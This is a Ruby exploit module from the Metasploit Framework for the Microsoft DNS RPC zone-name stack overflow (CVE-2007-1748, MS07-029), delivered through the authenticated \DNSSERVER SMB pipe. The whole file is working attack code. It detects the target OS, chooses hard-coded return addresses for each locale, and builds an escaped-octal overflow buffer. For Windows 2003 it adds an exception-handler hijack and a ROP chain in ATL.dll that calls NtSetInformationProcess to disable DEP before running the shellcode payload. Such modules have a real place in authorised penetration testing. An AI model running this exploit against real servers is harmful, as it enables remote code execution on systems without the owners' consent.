##
# $Id: ms07_029_msdns_zonename.rb 10503 2010-09-28 15:23:14Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the RPC interface
				of the Microsoft DNS service. The vulnerability is triggered
				when a long zone name parameter is supplied that contains
				escaped octal strings. This module is capable of bypassing NX/DEP
				protection on Windows 2003 SP1/SP2. This module exploits the
				RPC service using the \\DNSSERVER pipe available via SMB. This
				pipe requires a valid user account to access, so the SMBUSER
				and SMBPASS options must be specified.
			},
			'Author'         =>
				[
					'hdm',      # initial module
					'anonymous' # 2 anonymous contributors (2003 support)
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10503 $',
			'References'     =>
				[
					['CVE', '2007-1748'],
					['OSVDB', '34100'],
					['MSB', 'MS07-029'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/935964.mspx']
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'    => 500,

					# The payload doesn't matter, but make_nops() uses these too
					'BadChars' => "\x00",

					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic (2000 SP0-SP4, 2003 SP0, 2003 SP1-SP2)', { } ],

					# WS2HELP.DLL
					[ 'Windows 2000 Server SP0-SP4+ English', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x75022ac4 } ],
					[ 'Windows 2000 Server SP0-SP4+ Italian', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fd2ac4 } ],
					[ 'Windows 2000 Server SP0-SP4+ French', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fa2ac4 } ],

					# Use the __except_handler3 method (and jmp esp in ATL.dll)
					[ 'Windows 2003 Server SP0 English', { 'OS' => '2003SP0', 'Off' => 1593, 'Rets' => [0x77f45a34, 0x77f7e7f0, 0x76a935bf] } ],
					[ 'Windows 2003 Server SP0 French', { 'OS' => '2003SP0', 'Off' => 1593, 'Rets' => [0x77f35a34, 0x77f6e7f0, 0x76a435bf] } ],


					# ATL.DLL (bypass DEP/NX, IB -> Image Base of ATL.dll)
					[ 'Windows 2003 Server SP1-SP2 English', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a80000 } ],
					[ 'Windows 2003 Server SP1-SP2 French', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a30000 } ],
					[ 'Windows 2003 Server SP1-SP2 Spanish', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a30000 } ],
					[ 'Windows 2003 Server SP1-SP2 Italian', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76970000 } ],
					[ 'Windows 2003 Server SP1-SP2 German', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76970000 } ],

				],
			'DisclosureDate' => 'Apr 12 2007',
			'DefaultTarget'  => 0 ))

		register_options(
			[
				OptString.new('Locale', [ true,  "Locale for automatic target (English, French, Italian, ...)", 'English'])
			], self.class)
	end


	def gettarget(os)

		targets.each do |target|
			if ((target['OS'] =~ /#{os}/) && (target.name =~ /#{datastore['Locale']}/))
				return target
			end
		end

		return nil
	end


	def exploit

		connect()
		smb_login()

		if target.name =~ /Automatic/

			case smb_peer_os()
			when 'Windows NT 4.0'
				print_status("Detected a Windows NT 4.0 system...")
				target = nil

			when 'Windows 5.0'
				print_status("Detected a Windows 2000 SP0-SP4 target...")
				target = gettarget('2000')

			when 'Windows 5.1'
				print_status("Detected a Windows XP system...")
				target = nil

			when /Windows Server 2003 (\d+)$/
				print_status("Detected a Windows 2003 SP0 target...")
				target = gettarget('2003SP0')

			when /Windows Server 2003 (\d+) Service Pack (\d+)/
				print_status("Detected a Windows 2003 SP#{$2} target...")
				target = gettarget('2003SP12')
			else
				print_status("Unknown OS: #{smb_peer_os}")
				return
			end
		end

		if (not target)
			print_status("There is no available target for this OS locale")
			return
		end

		print_status("Trying target #{target.name}...")

		# Bind to the service
		handle = dcerpc_handle('50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_np', ['\dnsserver'])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		# Create our buffer with our shellcode first
		txt = Rex::Text.rand_text_alphanumeric(8192)

		if (target['OS'] =~ /2000/)
			txt[0, payload.encoded.length] = payload.encoded

			off = target['Off']
			txt[ off ] = [target.ret].pack('V')
			txt[ off - 4, 2] = "\xeb\x06"
			txt[ off + 4, 5] = "\xe9" + [ (off+9) * -1 ].pack('V')

		elsif (target['OS'] =~ /2003SP0/)
			txt[0, payload.encoded.length] = payload.encoded

			off = target['Off']
			txt[ off ] = [target['Rets'][0]].pack('V')  # __except_handler3
			txt[ off - 4, 2] = "\xeb\x16"

			# addr = A + B*12 + 4 = 0x77f7e7f0  (ntdll -> 0x77f443c9)
			addr = target['Rets'][1] - 4
			addr1 = addr / 2
			addr2 = addr1 + addr % 2
			addr1 = addr1 + (addr2 % 12)
			addr2 = addr2 / 12

			txt[ off + 4, 8] = [addr1, addr2].pack('VV') # A,B

			#
			# then mov eax, [addr] sets eax to 0x77f443c9 and the code goes here :
			#
			# 0x77f443c9 jmp off_77f7e810[edx*4]   ;  edx = 0 so jmp to 77f443d0
			# 0x77f443d0 mov eax, [ebp+arg_0]
			# 0x77f443d3 pop esi
			# 0x77f443d4 pop edi
			# 0x77f443d5 leave    ; mov esp, ebp
			# 0x77f443d6 retn     ; ret

			txt[ off + 16, 4] = [target['Rets'][2]].pack('V')  # jmp esp
			txt[ off + 20, 5] = "\xe9" + [ (off+23) * -1 ].pack('V')

		elsif (target['OS'] =~ /2003SP12/)
			off = target['Off']
			ib  = target['IB']
			txt[ off ] = [ib + 0x2566].pack('V')


			# to bypass NX we need to emulate the call to ZwSetInformationProcess
			# with generic value (to work on SP1-SP2 + patches)

			off = 445

			# first we set esi to 0xed by getting the value on the stack
			#
			# 0x76a81da7:
			# pop esi   <- esi = edh
			# retn

			txt[ off + 4, 4 ] = [ib + 0x1da7].pack('V')
			txt[ off + 28, 4] = [0xed].pack('V')

			# now we set ecx to 0x7ffe0300, eax to 0xed
			# 0x76a81da4:
			# pop ecx    <-  ecx = 0x7ffe0300
			# mov eax, esi   <- eax == edh
			# pop esi
			# retn

			txt[ off + 32, 4] = [ib + 0x1da4].pack('V')
			txt[ off + 36, 4] = [0x7ffe0300].pack('V')

			# finally we call NtSetInformationProcess (-1, 34, 0x7ffe0270, 4)
			# 0x7FFE0270 is a pointer to 0x2 (os version info :-) to disable NX
			# 0x76a8109c:
			# call dword ptr [ecx]

			txt[ off + 44, 4] = [ib + 0x109c].pack('V')  # call dword ptr[ecx]
			txt[ off + 52, 16] = [-1, 34, 0x7FFE0270, 4].pack('VVVV')

			# we catch the second exception to go back to our shellcode, now that
			# NX is disabled

			off = 1013
			txt[ off, 4 ] = [ib + 0x135bf].pack('V')   # (jmp esp in atl.dll)
			txt[ off + 24, payload.encoded.length ] = payload.encoded

		end

		req = ''

		# Convert the string to escaped octal
		txt.unpack('C*').each do |c|
			req << "\\"
			req << c.to_s(8)
		end

		# Build the RPC stub data
		stubdata =
			NDR.long(rand(0xffffffff)) +
			NDR.wstring(Rex::Text.rand_text_alpha(1) + "\x00\x00") +

			NDR.long(rand(0xffffffff)) +
			NDR.string(req + "\x00") +

			NDR.long(rand(0xffffffff)) +
			NDR.string(Rex::Text.rand_text_alpha(1) + "\x00")

		print_status('Sending exploit...')

		begin
			response = dcerpc.call(1, stubdata)

			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				print_status(">> " + dcerpc.last_response.stub_data.unpack("H*")[0])
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		handler
		disconnect
	end

end
